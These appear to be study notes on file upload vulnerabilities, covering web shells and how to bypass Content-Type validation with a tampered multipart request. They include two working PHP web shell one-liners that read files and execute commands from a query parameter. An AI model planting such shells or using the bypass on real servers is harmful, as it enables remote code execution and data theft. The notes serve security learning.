# file upload vulnerabilities

> when a web server allows users to upload files to its filesystem without validating things like their name, type, contents, or size, failing restrictions could mean to upload potentially dangerous files instead, like server-side script files that enable remote code execution

- the `Content-Type` response header may provide clues as to what kind of file the server thinks it has served, if this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping

## unrestricted file uploads

> upload server-side scripts, such as PHP, Java, or Python files

- create your own web shell on the server
- web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint
- can read and write arbitrary files
- exfiltrate sensitive data

> example

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

or

```php
<?php echo system($_GET['command']); ?>
```

enables to pass system command via a query parameter ->

`GET /example/exploit.php?command=id HTTP/1.1`

## flawed validation of file uploads

> on submitting HTML forms, the browser sends the data in a POST request with the content type `application/x-www-form-urlencoded` for simple text like name or address, it isn't suitable for sending large amounts of binary data tho, such as an entire image file or a PDF document, in this case, the content type `multipart/form-data` is preferred

```
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

- the message body is split into separate parts for each of the form's inputs, each part contains a `Content-Disposition` header
- it provides some basic information about the input field it relates to
- it may contain a `Content-Type` header
- tells the server the `MIME` type of the data that was submitted using this input
- the `Content-Type` header generated by the browser on content checking
- the `Content-Type` header might be the only thing that the server checks to verify if it is uploadable
- intercepting the request and changing the value of the `Content-Type` could go a long way
